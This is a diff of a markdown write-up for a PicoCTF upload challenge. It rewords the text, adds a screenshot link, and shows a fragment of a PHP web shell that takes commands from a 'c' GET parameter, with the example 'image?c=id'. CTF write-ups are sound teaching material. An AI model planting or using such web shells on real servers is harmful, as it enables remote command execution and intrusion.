@@ -10,14 +10,15 @@ What is MIME type ?
 ![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203429.png)
 
 
-This payload allows me to do this :
+I can then to do this :
 
 ```
 \\Example
 image?c=id
 ```
 
-Co
+The Payload :
+
 ```
 <?php
 if(isset($_GET['c'])) {
@@ -29,6 +30,10 @@ if(isset($_GET['c'])) {
 ```
 
 
+
+
+
+![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203734.png)
 
 
 
